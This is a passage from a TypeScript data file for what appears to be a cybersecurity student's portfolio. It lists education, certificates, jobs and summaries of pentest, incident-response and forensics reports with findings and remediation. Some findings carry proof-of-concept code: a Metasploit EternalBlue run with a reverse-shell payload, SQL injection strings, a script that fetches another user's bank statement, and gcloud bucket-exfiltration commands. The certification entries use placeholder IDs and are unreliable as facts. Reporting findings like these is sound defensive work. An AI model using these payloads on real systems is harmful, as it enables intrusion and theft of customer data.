    year: "2022 – 2026",
    coursework: [
      "Data Structures & Algorithms",
      "Operating Systems",
      "Database Systems",
      "Computer Networks",
      "Software Engineering",
      "Cyber Security Fundamentals",
    ],
    technologies: ["Python", "Java", "Linux", "MySQL", "Networking"],
    logoUrl: "/logos/chuka.jfif",
  },
  {
    id: "moringa",
    degree: "Cybersecurity Engineering",
    institution: "Moringa School",
    year: "Oct 2025 – Jul 2026",
    coursework: [
      "Network Security",
      "Penetration Testing",
      "Incident Response",
      "Web Application Security",
      "SIEM & Log Analysis",
      "Python for Security",
    ],
    technologies: ["Kali Linux", "Burp Suite", "Wireshark", "Python", "Nmap"],
    logoUrl: "/logos/moringa.jfif",
    badgeUrl: "https://www.credly.com/org/moringa-school",
    credentialUrl: "https://moringaschool.com",
  },
];

export type Cert = {
  id: string;
  title: string;
  issuer: string;
  description: string;
  why: string;
  pdfUrl: string;
  date?: string;
  category: "security" | "cloud" | "language" | "os" | "platform";
};

export const certs: Cert[] = [
  {
    id: "cti",
    title: "Cyber Threat Intelligence",
    issuer: "Certification Body",
    description: "Foundations of cyber threat intelligence — tracking threat actors, analysing TTPs (Tactics, Techniques, and Procedures), and producing actionable intelligence reports.",
    why: "Wanted to understand how defenders think beyond individual alerts — tracking adversary behaviour, mapping TTPs, and turning raw indicators into intelligence a SOC can actually act on.",
    pdfUrl: "/certs/cti.pdf",
    category: "security",
  },
  {
    id: "efset",
    title: "EF SET English Certificate",
    issuer: "EF Education First",
    description: "EF Standard English Test — internationally recognised English proficiency assessment demonstrating communication skills at a professional level.",
    why: "Security work is global — incident reports, vendor docs, and team communication all happen in English. Getting this certified removes any ambiguity for international employers.",
    pdfUrl: "/certs/EF SET Certificate.pdf",
    category: "language",
  },
  {
    id: "i2cs",
    title: "Introduction to Cybersecurity",
    issuer: "Cisco Networking Academy",
    description: "Cisco's I2CS course — covers online safety, how cyber attacks work, protecting personal and organisational data, and the basics of network defence.",
    why: "This was my first structured cybersecurity course. It gave me the vocabulary and mental model — CIA triad, attack lifecycle, defence-in-depth — that everything else builds on.",
    pdfUrl: "/certs/I2CSUpdate20260204-32-ry2hbk.pdf",
    date: "Feb 2026",
    category: "security",
  },
  {
    id: "ibm-cad",
    title: "Cloud Application Developer (CAD220EN)",
    issuer: "IBM / edX",
    description: "IBM-certified course on cloud-native application development — microservices architecture, containerisation, and deploying applications on IBM Cloud.",
    why: "Before you can secure cloud workloads, you need to understand how they're built and where the attack surface actually sits — misconfigurations look obvious once you know what correct looks like.",
    pdfUrl: "/certs/IBM CAD220EN Certificate _ edX.pdf",
    category: "cloud",
  },
  {
    id: "os-basics",
    title: "Operating Systems Basics",
    issuer: "Cisco Networking Academy",
    description: "Cisco NetAcad course covering OS fundamentals — file systems, process management, user and permission models, and basic Linux/Windows CLI administration.",
    why: "SOC work means reading Windows Event Logs and Linux syslog all day. Understanding OS internals — process trees, file permissions, service accounts — makes alerts make sense instead of just matching signatures.",
    pdfUrl: "/certs/OperatingSystemsBasicsUpdate20260204-31-bkrteh.pdf",
    date: "Feb 2026",
    category: "os",
  },
  {
    id: "thm-cert-1",
    title: "TryHackMe Certificate (1L5ZB8NTPR)",
    issuer: "TryHackMe",
    description: "Completion certificate for a structured TryHackMe learning path — hands-on rooms covering real-world cybersecurity skills and offensive/defensive techniques.",
    why: "Theory only gets you so far. This path forced me to actually exploit systems, investigate logs, and write detection logic — not just memorise frameworks.",
    pdfUrl: "/certs/THM-1L5ZB8NTPR.pdf",
    category: "platform",
  },
  {
    id: "thm-cert-2",
    title: "TryHackMe Certificate (NRPTZO14VH)",
    issuer: "TryHackMe",
    description: "Completion certificate for a second TryHackMe structured learning path — continued hands-on practice across security domains.",
    why: "The second path pushed deeper into network analysis and active directory attacks — areas that come up constantly in blue team work once you get past the basics.",
    pdfUrl: "/certs/THM-NRPTZO14VH.pdf",
    category: "platform",
  },
];

export const certifications: CertItem[] = [
  {
    id: "secplus",
    name: "CompTIA Security+",
    issuer: "CompTIA",
    earned: "2023-01",
    category: "security",
    credentialId: "COMP-PLACEHOLDER",
    verifyUrl: "https://www.comptia.org/",
  },
  {
    id: "ceh",
    name: "CEH",
    issuer: "EC-Council",
    earned: "2024-06",
    category: "security",
  },
  {
    id: "oscp",
    name: "OSCP",
    issuer: "OffSec",
    earned: "In progress",
    category: "security",
    inProgress: true,
    progressPct: 55,
  },
  {
    id: "aws-saa",
    name: "AWS Solutions Architect",
    issuer: "AWS",
    earned: "2022-09",
    category: "cloud",
  },
  {
    id: "google-cyber",
    name: "Google Cybersecurity Certificate",
    issuer: "Google",
    earned: "2023-11",
    category: "security",
  },
  {
    id: "cka",
    name: "Certified Kubernetes Administrator",
    issuer: "CNCF",
    earned: "2024-02",
    category: "cloud",
    credentialId: "CKA-PLACEHOLDER",
  },
  {
    id: "az-900",
    name: "Microsoft Azure Fundamentals",
    issuer: "Microsoft",
    earned: "2021-05",
    category: "cloud",
  },
  {
    id: "comptia-net",
    name: "CompTIA Network+",
    issuer: "CompTIA",
    earned: "2020-07",
    category: "networking",
    credentialId: "NET-PLACEHOLDER",
  },
  {
    id: "ccna",
    name: "CCNA",
    issuer: "Cisco",
    earned: "2021-11",
    category: "networking",
  },
  {
    id: "gcp-ace",
    name: "GCP Associate Cloud Engineer",
    issuer: "Google Cloud",
    earned: "In progress",
    category: "cloud",
    inProgress: true,
    progressPct: 30,
  },
  {
    id: "github-actions",
    name: "GitHub Actions Certification",
    issuer: "GitHub",
    earned: "2024-09",
    category: "development",
  },
  {
    id: "docker-dca",
    name: "Docker Certified Associate",
    issuer: "Docker",
    earned: "2023-05",
    category: "development",
    credentialId: "DCA-PLACEHOLDER",
  },
];

export const experience: ExperienceItem[] = [
  {
    id: "developer-bendypixels",
    title: "Developer",
    company: "BendyPixels.co",
    duration: "Nov 2024 — Sep 2025",
    location: "Remote",
    responsibilities: [
      "Built and shipped responsive client websites with performance-first frontend patterns.",
      "Implemented backend features and integrations for content and commerce workflows.",
      "Collaborated with design and product stakeholders to deliver polished user journeys.",
    ],
    tools: ["TypeScript", "Node.js", "WordPress", "Docker"],
    impact: "Delivered production features across multiple client projects.",
    accent: "web",
  },
  {
    id: "attache-teach2give",
    title: "Software Engineer Attache",
    company: "TEACH2GIVE",
    duration: "May 2025 — Aug 2025",
    location: "Chuka, Kenya",
    responsibilities: [
      "Contributed to software delivery tasks during a structured engineering attachment.",
      "Worked on API and database tasks while improving code quality and testing discipline.",
      "Supported team sprint execution and documentation for handover.",
    ],
    tools: ["Node.js", "Express", "PostgreSQL", "Git"],
    impact: "Improved implementation confidence through practical team delivery.",
    accent: "engineering",
  },
  {
    id: "tech-support-unplugged",
    title: "Technical Supporter",
    company: "Unplugged KE",
    duration: "Sep 2022 — Mar 2024",
    location: "Kenya",
    responsibilities: [
      "Provided day-to-day technical support and issue resolution for users and devices.",
      "Troubleshot software, networking, and configuration issues with clear user communication.",
      "Maintained service continuity through routine checks and escalation workflows.",
    ],
    tools: ["Linux", "Networking", "Troubleshooting", "Documentation"],
    impact: "Improved support turnaround and user satisfaction.",
    accent: "cyber",
  },
  {
    id: "trainee-eldohub",
    title: "Full-Stack Developer Trainee",
    company: "Eldohub Academy",
    duration: "Feb 2022 — May 2022",
    location: "Eldoret, Kenya",
    responsibilities: [
      "Completed practical full-stack training with focus on frontend and backend basics.",
      "Built guided learning projects covering APIs, database CRUD, and UI implementation.",
      "Strengthened engineering fundamentals and collaborative development practices.",
    ],
    tools: ["HTML5", "CSS3", "JavaScript", "Node.js"],
    impact: "Built portfolio-ready projects and production-oriented coding habits.",
    accent: "web",
  },
];

export const securityReports: SecurityReport[] = [
  {
    id: "r1",
    title: "Network Infrastructure Rebuild — Acme Corp",
    type: "network",
    teaser: "Every device on one flat network — one compromised host away from full lateral movement across the entire organisation.",
    pdfUrl: "/projects_docs/pentest.pdf",
    networkDiagramUrl: "/projects_docs/ACME.drawio (2).png",
    target: "Acme Corp on-premises internal network (full topology redesign)",
    scope: "Complete network rebuild: VLAN segmentation across all business units, firewall rule sets, managed switch configuration, DNS/DHCP hardening, and documentation of the finished topology",
    purpose: "Redesign the Acme Corp flat network into a properly segmented, documented, and hardened infrastructure that separates departments, restricts unnecessary lateral communication, and provides a clear foundation for ongoing security monitoring.",
    why: "The existing Acme network had no VLAN segmentation — every device shared one broadcast domain, which meant a single compromised host could reach any other device on the network. The rebuild enforces isolation between business units, reduces the blast radius of future incidents, and produces documented network diagrams required for compliance review.",
    methodology: [
      "Discovery: enumerated all connected devices, services, and existing IP ranges using Nmap and manual switch inspection to produce a baseline of the current flat topology.",
      "VLAN design: mapped business units to VLAN IDs (Admin, Finance, HR, IT, Guest), assigned subnets, and documented inter-VLAN routing policy based on least-privilege access.",
      "Firewall rule design: wrote access control lists (ACLs) permitting only necessary traffic between VLANs — e.g., Finance can reach the fileserver but not the IT management VLAN.",
      "Switch configuration: programmed 802.1Q trunk and access ports on managed switches; validated VLAN tagging and inter-switch trunk links.",
      "DNS and DHCP hardening: deployed per-VLAN DHCP scopes with appropriate lease times; configured DNS to resolve only internal records for internal VLANs.",
      "Diagram and documentation: produced a full network diagram (see above) showing device placement, VLAN boundaries, firewall checkpoints, and IP addressing scheme.",
    ],
    tools: ["Nmap", "Cisco Packet Tracer", "draw.io", "pfSense", "Wireshark", "Linux (Ubuntu Server)"],
    timeline: "2 weeks (1 week design + 1 week implementation and testing)",
    outcome: "Delivered a fully segmented network with 5 VLANs, documented firewall policy, and a complete topology diagram. Inter-VLAN reachability matched the design spec; unauthorised cross-VLAN traffic was blocked and verified via Wireshark captures.",
    lessonsLearned: [
      "Starting with a thorough discovery phase — even for small networks — prevents surprises during implementation; several undocumented IoT devices were found only during the Nmap sweep.",
      "Documenting the intended policy before touching any hardware saved significant rework; changes driven by undocumented assumptions always create more changes.",
      "Testing firewall rules bidirectionally (not just one direction) caught two ACL entries that silently allowed reverse traffic that should have been blocked.",
      "Even in a lab/small-business context, using a proper diagram tool (draw.io) rather than a whiteboard sketch makes the output useful for future administrators and auditors.",
    ],
    findings: [
      {
        id: "f1",
        title: "Flat Network — No VLAN Segmentation",
        severity: "high",
        cvss: "8.5",
        affected: "Entire Acme Corp network infrastructure",
        body: "All devices — including workstations, servers, printers, and IoT endpoints — shared a single broadcast domain with no logical separation between departments. Any device could initiate connections to any other device without restriction, creating significant lateral movement risk.",
        impact: "A single compromised endpoint could be used to reach finance servers, admin management interfaces, HR records, and IT infrastructure without any network-layer barriers. This configuration would allow an attacker or malware to pivot freely across the entire organisation.",
        remediation: "Segment the network using 802.1Q VLANs aligned to business units. Define explicit inter-VLAN firewall rules based on least-privilege access. Place high-value assets (finance, HR, admin) in isolated VLANs with no default inbound access from user VLANs.",
      },
      {
        id: "f2",
        title: "Undocumented IoT Devices on Corporate Network",
        severity: "medium",
        cvss: "5.9",
        affected: "Corporate LAN — discovered during Nmap discovery sweep",
        body: "Several IoT devices (smart TVs, IP cameras, a network-attached printer) were found connected to the main corporate VLAN with default credentials and no firmware update schedule. These devices were not in any asset register and had never been patched.",
        impact: "IoT devices with default credentials and no patch cadence are common entry points for attackers. Placement on the main corporate VLAN meant a compromise of any of these devices gave immediate access to the same network segment as workstations and file servers.",
        remediation: "Place all IoT and peripheral devices in a dedicated IoT VLAN with no outbound access to corporate VLANs. Change all default credentials. Establish a quarterly firmware update check for all network-connected devices. Add IoT assets to the asset register.",
      },
    ],
  },
  {
    id: "r2",
    title: "Incident Response — Ransomware Drill",
    type: "ir",
    teaser: "Ransomware hit the file server and the backup window had a 24-hour deletion gap. A race against the clock — and a gap that should never have existed.",
    pdfUrl: "/projects_docs/IR_Report_HSS%20.pdf",
    target: "Internal cloud infrastructure (GCP) — simulated ransomware compromise scenario",
    scope: "Cloud Storage buckets, Compute Engine instances, IAM service accounts, and backup/snapshot infrastructure across the production project",
    purpose: "Conduct a tabletop + technical incident response drill simulating a ransomware intrusion into the cloud environment, with the goal of identifying detection gaps, backup recovery reliability, and IR playbook completeness.",
    why: "Following a ransomware incident at a peer company in the same industry, leadership mandated a proactive drill to test whether the IR playbook, backup strategy, and detection capabilities were sufficient to recover from a ransomware scenario within the 4-hour RTO target.",
    methodology: [
      "Threat modelling: mapped the ransomware kill chain (initial access → privilege escalation → data exfil → encryption) against the GCP environment architecture.",
      "Backup validation: tested snapshot restore fidelity, measured restore times against RTO targets, and checked snapshot deletion permissions under different IAM roles.",
      "IAM audit: reviewed all service account permissions for over-privilege relative to their workload requirements using the principle of least privilege.",
      "Detection gap analysis: replayed attack IOCs (T1078, T1530, T1486) in the SIEM to identify which stages would have been detected vs missed.",
      "Playbook walk-through: ran the IR playbook against the simulated scenario and timed each response phase — containment, eradication, recovery, lessons learned.",
    ],
    tools: ["GCP Security Command Center", "gcloud CLI", "Elastic SIEM", "Cloud Audit Logs", "Forseti Security", "Terraform"],
    timeline: "2-day drill",
    outcome: "Identified 2 critical gaps: a backup immutability window that allowed snapshot deletion, and a service account with org-wide Storage read that created an exfiltration pivot. Both were remediated. Recovery from backup was achieved in 2h 40m — within the 4h RTO target.",
    lessonsLearned: [
      "Snapshot immutability is only useful if the retention lock period exceeds the attacker's dwell time — a 24-hour window is essentially no protection against a patient adversary.",
      "Service account over-privilege is the single most common lateral movement enabler in cloud environments — periodic IAM reviews with automated alerting on permission escalations are essential.",
      "The IR playbook had never been timed end-to-end against a realistic scenario — the drill revealed three steps that were ambiguous and added ~45 minutes of confusion.",
      "Cloud audit logs are often turned off for verbose API calls to save cost — but those are exactly the logs ransomware actors depend on you not having.",
      "Recovery drills should be run quarterly, not annually — storage costs for a sandbox environment are trivial compared to the cost of an untested playbook during a real incident.",
    ],
    findings: [
      {
        id: "f3",
        title: "Backup Snapshot Immutability Window — 24-Hour Deletion Gap",
        severity: "critical",
        cvss: "9.1",
        affected: "GCP Cloud Storage — snapshot retention policy on production buckets",
        body: "Snapshot retention policy was configured with a 24-hour lock period. Any IAM principal with `storage.buckets.delete` or `storage.objects.delete` permissions could delete snapshots within the lock window before the immutability constraint activated. A ransomware actor with a compromised admin account could delete all snapshots within minutes of gaining access — well within the 24-hour window.",
        impact: "Complete loss of backup data, eliminating the primary recovery mechanism. Without snapshots, recovery would require rebuilding from source code and a 6-month-old cold archive, making the actual RTO 5–7 business days rather than the target 4 hours.",
        remediation: "Increase snapshot lock period to 30 days minimum. Remove snapshot deletion permissions from all service accounts and restrict to a dedicated break-glass IAM group with MFA enforcement. Enable Cloud Audit Logs for all Storage API calls. Create an alerting rule for any snapshot deletion event that fires within the retention window.",
      },
      {
        id: "f4",
        title: "Service Account Over-Privilege — Org-Wide Storage Read",
        severity: "high",
        cvss: "8.3",
        affected: "sa-data-pipeline@project.iam.gserviceaccount.com",
        body: "The data pipeline service account was granted `roles/storage.objectViewer` at the organisation level rather than the bucket level. This gave the account read access to all Cloud Storage buckets across the entire GCP organisation — including backups, audit log exports, and other project data. After simulating initial compromise of the pipeline workload, this account was used to exfiltrate data from 14 unrelated buckets before any alert fired.",
        impact: "A single compromised pipeline workload becomes an exfiltration pivot for the entire organisation's cloud storage. Exfil of sensitive data from unrelated projects (PII, financial records, audit logs) would amplify the breach scope significantly beyond the initial compromise.",
        remediation: "Apply the principle of least privilege: bind all service accounts to the specific buckets they require, not at folder or organisation level. Audit all org-level IAM bindings quarterly. Use VPC Service Controls to restrict Storage API access to approved networks. Add an anomaly detection rule for service accounts accessing buckets outside their normal scope.",
        poc: `# Simulate exfil from a compromised pipeline service account
# (account has roles/storage.objectViewer @ org level)

gcloud storage ls gs://  # lists ALL buckets org-wide — should not be possible

# Enumerate buckets in other projects
gcloud storage buckets list --project=OTHER_PROJECT_ID

# Exfil from backup bucket (different project)
gcloud storage cp gs://backup-prod-2024/snapshots/ ./exfil/ --recursive`,
      },
    ],
  },
  {
    id: "r3",
    title: "Vulnerability Assessment — Internal Network Q4",
    type: "vuln",
    teaser: "EternalBlue still running in production. Default SNMP strings broadcasting the whole network layout. The last audit missed both.",
    pdfUrl: "/projects_docs/Manual%20And%20Tool-Assisted%20Penetration%20Test.pdf",
    target: "Internal corporate network — servers, workstations, and network infrastructure",
    scope: "192.168.0.0/16 internal network: servers (Windows/Linux), managed switches, routers, and printers. Excludes OT/ICS segment and VoIP VLAN.",
    purpose: "Conduct a quarterly internal vulnerability assessment to identify unpatched systems, misconfigurations, and exposed legacy services before year-end compliance audit.",
    why: "ISO 27001 compliance obligations required quarterly internal assessments. Q3 findings had not been fully remediated, and leadership wanted a fresh snapshot to present to the external auditor with accurate risk scores and a remediation roadmap.",
    methodology: [
      "Network discovery: Nmap TCP SYN scan (-sS) across all RFC-1918 ranges to identify live hosts and open ports.",
      "Service enumeration: version detection (-sV) and default script execution (-sC) on all discovered hosts.",
      "Vulnerability scanning: OpenVAS and Nessus scans against discovered hosts; cross-referenced results to reduce false positives.",
      "Manual validation: hand-verified critical and high findings before reporting to confirm exploitability and eliminate scanner noise.",
      "Risk rating: CVSS v3.1 base scores adjusted with environmental and temporal metrics for the specific network context.",
    ],
    tools: ["Nmap", "OpenVAS", "Nessus Essentials", "Metasploit (validation only)", "Wireshark", "enum4linux"],
    timeline: "3 days (1 day scanning + 1 day validation + 1 day reporting)",
    outcome: "Identified 3 confirmed vulnerabilities (2 critical, 1 medium, 1 low). The critical EternalBlue finding required immediate emergency patching; the remaining findings were scheduled into the next sprint cycle.",
    lessonsLearned: [
      "Legacy Windows hosts in internal segments are often forgotten by patch management tools — manual inventory reconciliation against AD is essential before any assessment.",
      "SNMP v2 with default community strings is shockingly common even in mature environments; it's worth scanning for as a first-pass quick win.",
      "Automated scanner results need manual validation — both OpenVAS and Nessus produced false positives on the FTP finding that would have wasted remediation effort.",
      "Presenting risk findings to non-technical leadership requires mapping CVEs to business impact scenarios, not just severity scores.",
      "Patch management SLAs need enforcement mechanisms — the EternalBlue host had been flagged in Q3 and not remediated because there was no accountability owner.",
    ],
    findings: [
      {
        id: "f5",
        title: "Unpatched EternalBlue (MS17-010) on Legacy Windows Server",
        severity: "critical",
        cvss: "9.8",
        affected: "WINSVR-LEGACY-03 (Windows Server 2012 R2) — 192.168.15.43",
        body: "One Windows Server 2012 R2 host remained unpatched for MS17-010 (EternalBlue SMB vulnerability, CVSS 9.8) and was accessible from the DMZ VLAN. The vulnerability allows unauthenticated remote code execution via a crafted SMB packet to port 445. This is the same vulnerability exploited by WannaCry and NotPetya ransomware campaigns in 2017.",
        impact: "Unauthenticated remote code execution with SYSTEM-level privileges. An attacker with network access to the host — including anyone on the DMZ — could achieve full server compromise, use it as a lateral movement pivot, or deploy ransomware. The host was running a legacy reporting application with database credentials stored in config files.",
        remediation: "Apply Microsoft patch KB4012212 immediately (emergency change). If patching is not immediately possible, disable SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`) and isolate the host from DMZ access via firewall ACL as a temporary mitigation. Decommission the host and migrate the legacy application to a supported OS as the long-term fix. Add automated detection for unpatched MS17-010 to the quarterly scan baseline.",
        poc: `# Validation using Metasploit (lab environment only)
# DO NOT run against production systems without written authorisation

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit > set RHOSTS 192.168.15.43
msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit > set LHOST 192.168.1.100
msf6 exploit > run

# Expected output (vulnerable host):
# [*] Started reverse TCP handler on 192.168.1.100:4444
# [+] 192.168.15.43:445 - ETERNALBLUE overwrite completed
# [*] Meterpreter session 1 opened`,
      },
      {
        id: "f6",
        title: "Default SNMP Community Strings on Network Devices",
        severity: "medium",
        cvss: "5.3",
        affected: "12 managed switches and routers across core and distribution layers",
        body: "Twelve network devices (Cisco Catalyst switches and an HP router) were configured with the default SNMPv2 community string 'public' for read access. SNMP v2 transmits community strings in cleartext. Using these strings, an attacker with network access can enumerate the full network topology, ARP tables, routing tables, interface statistics, and device configurations.",
        impact: "Full network topology disclosure. An attacker could map the internal network layout, identify high-value targets, and plan lateral movement routes without generating any notable log entries. Topology information dramatically reduces the reconnaissance phase of a targeted attack.",
        remediation: "Change all SNMP community strings to randomised 20+ character values. Disable SNMP v2 and migrate to SNMPv3 with authentication and privacy (AES-128 minimum). Restrict SNMP access to dedicated management VLAN via ACL. Consider disabling SNMP entirely on devices where it is not actively used for monitoring.",
      },
      {
        id: "f7",
        title: "Active Cleartext FTP Service on File-Transfer Server",
        severity: "low",
        cvss: "3.7",
        affected: "FTP-SRV-01 (Ubuntu 18.04) — 192.168.20.12, port 21",
        body: "An FTP server (vsftpd 3.0.3) remained active on the file-transfer server for a legacy integration with a third-party vendor. FTP transmits both credentials and file content in cleartext. Wireshark capture on the same VLAN confirmed that authentication credentials were visible in packet captures during a test transfer.",
        impact: "Any user with access to the internal VLAN can passively capture FTP credentials and file contents using a network tap or ARP spoofing. Credential capture could enable further access to the FTP server and any other services sharing the same password.",
        remediation: "Migrate the legacy vendor integration to SFTP (SSH File Transfer Protocol) on port 22. If the vendor cannot support SFTP, use FTPS (FTP over TLS) as a compromise. Disable the plain FTP service (`systemctl disable vsftpd && systemctl stop vsftpd`) once the migration is complete. Audit whether the FTP credentials are reused on any other internal systems.",
      },
    ],
  },
  {
    id: "r4",
    title: "Web App Pentest — FinTech Client Portal",
    type: "pentest",
    teaser: "A date-range filter that broke SQL isolation. An API endpoint that let any user download any account's statements. Two critical flaws in a live financial portal.",
    pdfUrl: "/projects_docs/Web%20Application%20Security.pdf",
    target: "FinTech client-facing web portal (production) — account management, transaction history, and statement download flows",
    scope: "Authenticated and unauthenticated attack surface of the customer-facing portal. Excludes mobile app API and internal admin panel (separate engagement).",
    purpose: "Perform an authenticated penetration test of the FinTech client portal to assess OWASP Top 10 exposure, with particular focus on financial data access controls and transaction integrity.",
    why: "Regulatory pressure from the Central Bank's cybersecurity framework required the client to conduct annual penetration tests of all customer-facing systems. The prior year's report had flagged authorisation controls as a concern — this engagement followed up with deeper testing of those specific areas.",
    methodology: [
      "Authenticated session analysis: captured all API requests during normal customer workflows using Burp Suite proxy to build a complete endpoint inventory.",
      "Authorisation testing: created two test customer accounts (different customers, different statement datasets) and cross-tested all object references between them.",
      "Input validation: automated Burp active scan against all identified endpoints; manually tested transaction filter parameters for injection vulnerabilities.",
      "Transport security review: checked TLS configuration (testssl.sh), HSTS headers, cookie security flags, and CORS policy.",
      "Session management: tested session fixation, token entropy, logout handling, and concurrent session controls.",
    ],
    tools: ["Burp Suite Pro", "testssl.sh", "sqlmap (validation)", "OWASP ZAP", "jwt_tool", "Postman"],
    timeline: "4 business days",
    outcome: "Identified 3 valid findings (1 critical, 1 high, 1 low). The SQL injection finding was the most severe — it allowed full database extraction via the transaction date filter with no authentication bypass required. All findings were remediated within 2 weeks of report delivery.",
    lessonsLearned: [
      "SQL injection in financial APIs is still distressingly common — raw query concatenation often persists in 'internal' or 'admin' endpoints that were deprioritised for security review.",
      "BOLA/IDOR findings in financial systems require two test accounts with distinct, non-overlapping data sets — using a single account makes cross-customer access impossible to demonstrate clearly.",
      "HSTS misconfiguration is trivial to fix but requires an explicit deployment step — it should be in the deployment checklist, not left to developers to remember.",
      "sqlmap is useful for confirming SQL injection but its output is noisy and often over-reports; manual verification of the injection point is always worth doing before including it in a report.",
      "Providing a 'risk-ordered' remediation table (not just CVSS-ordered) dramatically helps development teams prioritise — a critical finding in a low-traffic endpoint may be less urgent than a high finding in the main checkout flow.",
    ],
    findings: [
      {
        id: "f8",
        title: "SQL Injection in Transaction Date-Range Filter",
        severity: "critical",
        cvss: "9.8",
        affected: "GET /api/transactions?from=<date>&to=<date>",
        body: "The `from` and `to` date parameters in the transaction history filter were concatenated directly into a raw SQL query without parameterisation. The application used string formatting to build the WHERE clause, and no input validation or WAF was in place for the API endpoint. Confirmed time-based blind SQLi via `SLEEP()` injection; escalated to UNION-based extraction to confirm full database read access.",
        impact: "Full database read access without any privilege escalation. The database user had SELECT rights across all application tables including customer PII (name, address, national ID), account balances, full transaction histories, hashed passwords, and internal audit logs. Exploiting this vulnerability would constitute a notifiable data breach under applicable regulations.",
        remediation: "Immediately switch to parameterised queries (prepared statements) for all database interactions — no string concatenation in SQL. Audit all other API endpoints for the same pattern. Apply principle of least privilege to the database user: the API account should have SELECT only on the tables it needs. Deploy a WAF rule targeting SQL keyword injection as a defence-in-depth measure (not a primary fix).",
        poc: `# Step 1: Confirm time-based blind SQLi
curl -s "https://portal.fintech-client.example/api/transactions?\\
  from=2024-01-01' AND SLEEP(5)--&to=2024-12-31"
# Response delays ~5 seconds → confirmed SQLi

# Step 2: UNION-based extraction (DB version)
# from=2024-01-01' UNION SELECT 1,version(),3,4,5--

# Step 3: Extract customer table (simplified)
# from=2024-01-01' UNION SELECT customer_id,email,full_name,
#   national_id,account_number FROM customers LIMIT 10--

# Parameterised query fix (Node.js / pg example):
const result = await db.query(
  'SELECT * FROM transactions WHERE date BETWEEN $1 AND $2',
  [req.query.from, req.query.to]  // parameterised — safe
);`,
      },
      {
        id: "f9",
        title: "Broken Object-Level Authorisation on Statement Downloads",
        severity: "high",
        cvss: "8.1",
        affected: "GET /api/statements/:statement_id/download",
        body: "Authenticated customers could download monthly statements belonging to other customers by iterating the `statement_id` path parameter. The endpoint verified that the user was authenticated but did not verify that the requested statement belonged to the requesting user's account. Statement IDs were sequential integers starting from 1.",
        impact: "Any authenticated customer could enumerate and download statements for all other customers. Monthly statements contain full transaction histories, account balances, and personal details. In a financial context, this is a serious breach of customer confidentiality and a regulatory violation.",
        remediation: "Add an ownership check in the service layer: verify that the statement's account_id matches the authenticated user's account_id before returning any data. Replace sequential integer IDs with UUIDs on all customer-facing resources to eliminate enumeration as an attack vector. Add an automated BOLA test to the regression suite using two test accounts.",
        poc: `# Two test accounts: user A (statement_id=4421), user B (statement_id=6800)
# Logged in as user A:

import requests, io

token_a = "eyJhbGci..."  # valid token for user A

# Access user B's statement — should be 403, returns 200
r = requests.get(
    "https://portal.fintech-client.example/api/statements/6800/download",
    headers={"Authorization": f"Bearer {token_a}"},
)
print(r.status_code)          # 200 — confirms BOLA
print(r.headers["Content-Type"])  # application/pdf
with open("stolen_statement.pdf", "wb") as f:
    f.write(r.content)`,
      },
      {
        id: "r4-f10",
        title: "Missing HSTS Header on Login Subdomain",
        severity: "low",
        cvss: "3.7",
        affected: "https://login.portal.fintech-client.example",
        body: "The login subdomain (`login.portal.fintech-client.example`) did not include a `Strict-Transport-Security` (HSTS) header. The main application domain had HSTS configured, but the login subdomain — deployed separately — was missed. On networks where an attacker can intercept traffic (public Wi-Fi, hostile network), this allows an SSL stripping attack to downgrade the HTTPS connection to HTTP.",
        impact: "On a hostile network, an attacker performing SSL stripping could intercept customer credentials submitted on the login page over HTTP. While exploitation requires network-level access (not trivially achieved), the login page is the highest-value target and should have the strongest transport security.",
        remediation: "Add `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to the login subdomain's server configuration. Verify HSTS is applied at the load balancer level, not just the application, to prevent subdomain gaps when deploying new services. Add to the deployment checklist.",
      },
    ],
  },
  {
    id: "r5",
    title: "Digital Forensics Investigation — Insider Threat",
    type: "ir",
    teaser: "847 confidential files left the building before the resignation email arrived. The registry, LNK files, and memory told the full story.",
    pdfUrl: "/projects_docs/Forensic_Report.pdf",
    target: "Windows workstation and file server — suspected insider data exfiltration",
    scope: "Single Windows 10 endpoint and associated network shares; memory image, disk image, and Windows Event Logs.",
    purpose: "Conduct a forensic investigation to determine whether a departing employee exfiltrated confidential files before their access was revoked, and to produce evidence suitable for HR proceedings.",
    why: "The security team flagged unusual USB activity and large file transfers from an employee's workstation in the 72 hours before their resignation. A structured forensic investigation was needed to establish a timeline, identify what was taken, and preserve evidence.",
    methodology: [
      "Evidence acquisition: created forensic images of the target workstation's hard drive and captured a memory dump using FTK Imager. Hashes verified (SHA-256) and documented in chain of custody.",
      "Timeline reconstruction: parsed Windows Event Logs (Security, System, Application) and Prefetch files to build a chronological activity timeline around the suspect period.",
      "USB and removable media analysis: extracted USB device history from the Windows Registry (USBSTOR, MountedDevices) to identify all connected storage devices and their first/last connection timestamps.",
      "File access analysis: examined $MFT records and LNK files to identify files accessed, copied, or deleted. Cross-referenced with the exfiltration timeframe.",
      "Memory analysis: searched memory dump for running processes, network connections, and browser artifacts at the time of the incident using Volatility.",
      "Report: produced a timestamped, evidence-referenced forensic report suitable for HR and legal review.",
    ],
    tools: ["FTK Imager", "Autopsy", "Volatility 3", "RegRipper", "Event Log Explorer", "ExifTool"],
    timeline: "3 business days",
    outcome: "Confirmed exfiltration of 847 files (including marked-confidential design documents and a client database export) to two USB devices and a personal Google Drive account. USB serial numbers identified. Timeline established: activity occurred across four sessions in the 48 hours before resignation. Findings were handed to legal counsel.",
    lessonsLearned: [
      "Chain of custody documentation is non-negotiable — even for internal investigations. Without it, evidence is inadmissible and the whole investigation can be challenged.",
      "LNK files and Prefetch entries are often overlooked by non-technical staff performing cover-up attempts; they are frequently the most valuable forensic artifacts.",
      "DLP controls that alert on large USB writes or cloud uploads would have flagged this in real time instead of requiring a reactive forensic investigation.",
      "Memory analysis revealed a browser session that had already been deleted from disk — always capture memory early if the device is still running.",
    ],
    findings: [
      {
        id: "r5-f1",
        title: "Confirmed File Exfiltration to USB Devices",
        severity: "critical",
        cvss: "9.1",
        affected: "Windows 10 workstation — USB ports",
        body: "Registry analysis (USBSTOR) identified two USB mass storage devices connected during the suspect window. MFT timestamp analysis and LNK files confirmed 847 files were accessed and copied to those devices, including files tagged as CONFIDENTIAL in their metadata.",
        impact: "Loss of confidential design documents and a full client database export. Potential breach of NDA and data protection obligations. Regulatory notification may be required depending on the data classification of the client database.",
